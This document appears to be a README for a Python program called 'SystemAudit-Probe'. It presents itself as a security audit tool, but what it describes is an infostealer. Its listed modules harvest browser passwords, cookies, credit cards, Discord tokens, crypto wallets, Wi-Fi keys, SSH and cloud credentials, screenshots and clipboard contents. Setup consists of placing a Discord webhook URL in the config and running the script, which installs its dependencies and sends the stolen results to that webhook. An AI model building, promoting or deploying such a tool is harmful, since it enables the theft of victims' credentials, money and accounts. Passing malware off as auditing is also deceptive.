📖 Overview
SystemAudit-Probe performs comprehensive system auditing across 16 distinct modules:

#	Module	Description
01	System Intelligence	Hostname, IP (internal/external), user, OS, architecture, boot time
02	Browser Password Audit	Extracts stored credentials from Chrome, Edge, Brave, Opera, Vivaldi, and Firefox
03	Cookie Analysis	Captures session cookies, authentication tokens, and login data
04	Payment Data Discovery	Identifies stored credit card information in browser databases
05	Browser History Forensics	Retrieves recent browsing activity for security analysis
06	Discord Token Detection	Locates Discord authentication tokens in local storage
07	Cryptocurrency Wallet Locator	Finds wallet files for Bitcoin, Ethereum, Monero, Electrum, Exodus, Atomic, and MetaMask
08	Wi-Fi Security Audit	Extracts saved wireless network credentials for password strength analysis
09	Environment Variable Scan	Identifies hardcoded secrets, API keys, and cloud credentials
10	Screenshot Capture	Documents current desktop state for forensic records
11	Clipboard Analysis	Captures current clipboard content for data leakage detection
12	File System Reconnaissance	Locates sensitive files: SSH keys, AWS configs, Kubernetes manifests, documents
13	Process & Network Analysis	Lists running processes and active TCP/UDP connections
14	Software Inventory	Enumerates installed applications for vulnerability assessment
15	Session Detection	Identifies Telegram and Steam session files
16	Browser Extension Audit	Lists installed extensions for security posture evaluation
🚀 Quick Start
Installation
bash
git clone https://github.com/yourusername/SystemAudit-Probe.git
cd SystemAudit-Probe
python systemaudit_probe.py
The script will automatically:

✅ Detect missing dependencies

✅ Install required packages via pip

✅ Execute the full system audit

✅ Deliver results to your configured endpoint

Requirements
Python 3.8 or higher

Windows 10/11 (primary support)

Administrative privileges are optional but enable full scanning capability

🔧 Configuration
Step 1: Open systemaudit_probe.py

Step 2: Locate the configuration section:

python
# ------------------- CONFIG -------------------
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"  # <--- REPLACE THIS
Step 3: Replace with your Discord webhook URL and save.

Step 4: Execute:

bash
python systemaudit_probe.py
